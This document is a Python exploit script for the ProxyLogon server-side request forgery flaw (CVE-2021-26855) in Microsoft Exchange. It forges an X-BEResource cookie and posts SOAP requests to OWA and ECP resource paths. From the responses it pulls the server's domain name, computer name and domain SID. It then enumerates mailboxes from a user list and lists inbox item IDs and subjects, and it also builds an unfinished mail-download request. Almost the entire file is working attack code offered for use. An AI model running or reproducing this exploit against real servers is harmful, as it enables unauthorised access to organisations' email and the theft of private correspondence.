'''
Author: Udyz
Referral:
- https://gist.github.com/testanull/324546bffab2fe4916d0f9d1f03ffa09
- https://raw.githubusercontent.com/microsoft/CSS-Exchange/main/Security/http-vuln-cve2021-26855.nse
- https://github.com/projectdiscovery/nuclei-templates/blob/master/cves/2021/CVE-2021-26855.yaml
- https://www.volexity.com/blog/2021/03/02/active-exploitation-of-microsoft-exchange-zero-day-vulnerabilities/
- https://proxylogon.com
- https://github.com/GreyOrder/CVE-2021-26855/blob/main/CVE-2021-26855.go
[*] CVE-2021-26855 SSRF Exchange Server
'''
import requests
import sys
import re
import time
from multiprocessing.dummy import Pool as ThreadPool
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
import tldextract
#i don't know how to use regex domain without subdomain, so im gonna use this modules...
def exploit(url):
	try:
		print('[*] Target: %s'%url)
		server = url + '/owa/auth.owa'
		#data_server = "destination=https%3A%2F%2Fnothing%2Fowa%2F&flags=4&forcedownlevel=0&username=pentest&password=pentest'&passwordText=&isUtf8=1"
		#print(data_server)
		req = requests.post(server, verify=False,timeout=5)
		if not req.status_code == 400:
			print('[-] Target is not Vuln!')
			exit(0)
		server_name = req.headers["X-FEServer"]
		print('(*) Getting FQDN Name: %s'%(server_name))
		path_maybe_vuln = ['/owa/auth/Current/themes/resources/logon.css','/owa/auth/Current/themes/resources/owafont_ja.css','/owa/auth/Current/themes/resources/lgnbotl.gif','/owa/auth/Current/themes/resources/owafont_ko.css','/owa/auth/Current/themes/resources/SegoeUI-SemiBold.eot','/owa/auth/Current/themes/resources/SegoeUI-SemiLight.ttf','/owa/auth/Current/themes/resources/lgnbotl.gif','/owa/auth/Current/', '/ecp/default.flt', '/ecp/main.css']
		headers = {
		'User-Agent': 'Hello-World',
		'Cookie': 'X-BEResource={FQDN}/EWS/Exchange.asmx?a=~1942062522;'.format(FQDN=server_name),
		'Connection': 'close',
		'Content-Type': 'text/xml'
		}
		#ver = 0
		#version_2016 = ['15.1.225.16', '15.1.225.42', '15.1.396.30', '15.1.466.34', '15.1.544.27', '15.1.669.32', '15.1.845.34', '15.1.1034.26' , '15.1.1261.35', '15.1.1415.2', '15.1.1466.3', '15.1.1531.3', '15.1.1591.01', '15.1.1713.5', '15.1.1779.2']
		#find_version = url + '/owa/auth/logon.aspx'
		#req_ver = requests.get(find_version, verify=False)
		#if '/owa/auth/15.0.1178' in req_ver.text:
			#ver = '2013'
		#for f in version_2016:
			#elif f in req_ver.text:
				#ver = '2016'
		#else:
			#ver = '2019'
		#print('(+) Getting Exchange Version: %s' %ver)
		payload = """<?xml version="1.0" encoding="utf-8"?>
					<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" 
					xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages" 
					xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types" 
					xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
					    <soap:Body>
					        <m:GetFolder>
					            <m:FolderShape>
					                <t:BaseShape>Default</t:BaseShape>
					            </m:FolderShape>
					            <m:FolderIds>
					                <t:DistinguishedFolderId Id="inbox">
					                    <t:Mailbox>
					                        <t:EmailAddress>admin@domain.tld</t:EmailAddress>
					                    </t:Mailbox>
					                </t:DistinguishedFolderId>
					            </m:FolderIds>
					        </m:GetFolder>
					    </soap:Body>
					</soap:Envelope>
		"""
		for x in path_maybe_vuln:
			reqs = requests.post('%s/%s' %(url,x),headers=headers,data=payload, verify=False,timeout=5)
			if reqs.status_code == 200:
				#print(reqs.text)
				print('(+) Path %s is vuln to CVE-2021-26855!'%x)
				#print(reqs.headers)
				print('(*) Getting Information Server')
				print('(+) Domain Name = %s'%reqs.headers["X-DiagInfo"])
				print('(+) Computer Name = %s'%reqs.headers["X-CalculatedBETarget"].split(',')[1])
				print('(+) Domain SID = %s'%reqs.headers["Set-Cookie"].split('X-BackEndCookie=')[1].split(';')[0])
				#print('(*) The SMTP address has no mailbox associated with it.')
				print('(*) Find valid mail from users list')
				u_m = reqs.headers["X-CalculatedBETarget"].split(',')[1]
				f = open('users.txt').read().splitlines()
				for u in f:
					domainstr = tldextract.extract(u_m)
					domain = "{}.{}".format(domainstr.domain, domainstr.suffix)
					user = u
					if ('local' in u_m):
						domain = '%s.local'%reqs.headers["X-CalculatedBETarget"].split(',')[1].split('.')[1]
					mail = '{user}@{domain}'.format(user=user, domain=domain)
					maillist = """<?xml version='1.0' encoding='utf-8'?>
					<soap:Envelope
					 xmlns:soap='http://schemas.xmlsoap.org/soap/envelope/'
					 xmlns:t='http://schemas.microsoft.com/exchange/services/2006/types'
					 xmlns:m='http://schemas.microsoft.com/exchange/services/2006/messages'
					 xmlns:xsi='http://www.w3.org/2001/XMLSchema-instance'>
					  <soap:Body>
					    <m:FindItem Traversal='Shallow'>
					      <m:ItemShape>
					        <t:BaseShape>AllProperties</t:BaseShape>
					      </m:ItemShape>
					      <m:IndexedPageItemView MaxEntriesReturned="5" Offset="0" BasePoint="Beginning" />
					      <m:ParentFolderIds>
					        <t:DistinguishedFolderId Id='inbox'>
					          <t:Mailbox>
					            <t:EmailAddress>{mail}</t:EmailAddress>
					          </t:Mailbox>
					        </t:DistinguishedFolderId>
					      </m:ParentFolderIds>
					    </m:FindItem>
					  </soap:Body>
					</soap:Envelope>
					""".format(mail=mail)
					reqx = requests.post('%s/%s' %(url,x),headers=headers,data=maillist, verify=False)
					#print(reqx.text)
					#print('(*) Getting Mail from list')
					if('t:Mailbox' in reqx.text):
						print('(+) %s => ACCESS GRANTED'%(mail))
						print('(+) Woowow Target is vuln!!!')
						xmlstr = """{data}""".format(data=reqx.text)
						#reg_ea = re.findall('(?:<t:EmailAddress>)(.+?)(?:</t:EmailAddress>)', xmlstr)
						reg_id = re.findall('(?:t\:ItemId\sId=")(.+?)(?:")', xmlstr)
						reg_key = re.findall('(?:t\:ItemId\sId=".+?"\sChangeKey=")(.+?)(?:")', xmlstr)
						reg_sub = re.findall('(?:<t:Subject>)(.+?)(?:</t:Subject>)', xmlstr)
						print('(*) Dump content mail')
						itemid = ''
						key = ''
						sub = ''
						count_id=0
						for i in range(0,len(reg_id)):
							count_id += 1
						#itemid in reg_id:
							#for key in reg_key:
								#for sub in reg_sub:
									#count_id+=1
							print('-----------')
							print('ID: '+ str(count_id))
							print('ItemId: ' + str(reg_id[i]))
							print('Key: ' + str(reg_key[i]))
							print('Subject: ' + str(reg_sub[i]))
									#im sicks for this help me guy ;-;, im noob
						time.sleep(0.5)
						print('(*) Trying to download data')
						download = """<?xml version="1.0" encoding="utf-8"?>
							<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" 
							xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages" 
							xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types" 
							xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
							  <soap:Body>
							    <m:GetItem>
							      <m:ItemShape>
							        <t:BaseShape>AllProperties</t:BaseShape>
							        <t:BodyType>Text</t:BodyType>
							      </m:ItemShape>
							      <m:ItemIds>
							        <t:ItemId Id="{id}" ChangeKey="{key}" />
							      </m:ItemIds>
							    </m:GetItem>
							  </soap:Body>
							</soap:Envelope>
						""".format(id=itemid,key=key)
						print('Someone help me..., im tireddd!')
						exit(0)
					elif 'Access is denied. Check credentials and try again' in reqx.text:
						print('(!) %s => Access is denied. Check credentials and try again'%(mail))
					else:
						print('(-) %s => Invalid mail'%(mail))
				exit(0)
			else:
				print('(-) Path %s is not vuln to CVE-2021-26855!'%x)
	except Exception as e:
		print(e)
		pass
	except(requests.ConnectionError, requests.ConnectTimeout, requests.ReadTimeout) as e:
		print(e)
		pass
if(len(sys.argv) < 2):
	print('[*] CVE-2021-26855 SSRF Exchange Server\n./%s <https://url>\n--------------------\n+ Author: github.com/Udyz\n+ twitter.com/lotusdll\n--------------------\n'%(sys.argv[0]))
	exit(0)
exploit(sys.argv[1])